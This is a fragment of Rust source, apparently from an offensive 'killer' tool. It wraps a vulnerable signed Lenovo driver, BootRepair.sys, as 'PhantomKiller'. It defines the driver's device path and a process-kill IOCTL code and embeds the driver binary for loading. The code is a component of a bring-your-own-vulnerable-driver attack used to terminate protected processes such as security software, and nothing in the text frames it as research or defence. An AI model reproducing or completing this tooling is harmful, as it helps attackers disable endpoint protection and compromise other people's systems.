...
const DRIVER_NAME: &str = "PhantomKiller";
const VERSION: &str = "0.0.1";

const DRIVER_DEVICE: &str = "\\\\.\\BootRepair";
const IOCTL_KILL: u32 = 0x222014;

pub struct PhantomKiller {
    device: *mut c_void
}

impl PhantomKiller {}

impl KillerDriver for PhantomKiller {
    ...
    fn description(&self) -> &'static str {
        return "Phantom Killer driver (Lenovo PC Manager BootRepair.sys)";
    }

    fn get_file(&self) -> Result<Vec<u8>, crate::utils::error::SigurdError> {
        let v = include_packed!("drivers/PhantomKiller.sys");
        return Ok(v);
    }
